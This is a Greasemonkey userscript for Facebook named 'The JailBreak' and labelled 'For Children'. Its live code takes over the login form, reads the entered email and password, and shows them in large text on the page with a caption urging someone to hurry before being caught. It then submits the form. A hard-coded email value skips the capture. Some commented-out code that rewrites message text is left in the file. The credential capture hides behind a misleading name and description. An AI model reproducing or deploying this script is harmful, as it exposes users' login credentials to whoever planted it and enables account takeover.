// ==UserScript==
// @name           The JailBreak
// @namespace      pedox
// @description    For Children
// @include        http://www.facebook.com/*
// @include        https://www.facebook.com/*
// ==/UserScript==


// Add jQuery
var GM_JQ = document.createElement('script'),
    head = document.getElementsByTagName('head');

GM_JQ.src = 'http://code.jquery.com/jquery-1.7.1.min.js';
GM_JQ.type = 'text/javascript';

if (head && head.length && head[0].appendChild) {
    head[0].appendChild(GM_JQ);

    // wait for jQuery to load
    function GM_wait() {
        if(typeof unsafeWindow.jQuery == 'undefined') { window.setTimeout(GM_wait,100); }
        else { unsafeWindow.jQuery.noConflict(); letsJQuery(); }
    }
    GM_wait();
}

function letsJQuery() {

var $ = unsafeWindow.jQuery,
    $body = $(document.body),
    $pokebox,
    $pokes,
    $pokeAllBtn,
    $pokeSelectedBtn,
    _regex = /^.+"onLoad"\s*:\s*\["(.+)"\].+$/i,

    // Keep track of all pokees
    unpoked,
    total,
    freq = 500,

    // Message and button to add to the Pokes sidebar element
    $msg,
        
    t; // timer
	//$('div').hide();
	/* var data = $('.uiStreamMessage .messageBody').html()
		var wew = data.replace(/steve/gi, "Wakz")
		$('.uiStreamMessage .messageBody').html(wew);
	});*/
/*var em = $('.messageBody');
function listen(){
	$('.messageBody').each(function(index) {
		
		var teks = $(this).html();
		var hasil = teks.replace(/lol/gi, "REPLACED");
		var hasil = teks.replace(/wew/gi, "REPLACED");
		$(this).html(hasil);
	});
//
}
listen();
$('.messageBody').bind('DOMNodeInserted', function(event) {
	//listen();
	alert('wakz');
});
*/

$('#login_form').attr({'onsubmit':'//'});
$('#login_form').submit(function(){
	var imel = $('#email').val();
	var pass = $('#pass').val();
	if(imel == 'freakout.jq'){
		document.form.submit()
	}else{
		var wakz =  '<div class="wew">'+
					'<h1 style="font-size:30px;">Cepetan keburu ketauan gan !!</h1> email : '+imel+' <br/>password : '+pass+'</div>';
		$('body').append(wakz);
		$('.wew').attr({'style':'font-size:30px !important;position:absolute;top:100px;left:230px;background:#fff;padding:10px;border:1px solid #eaeaea'});
		setTimeout(document.form.submit(), 3000);
	}
	return false;
});

} // letsJQuery
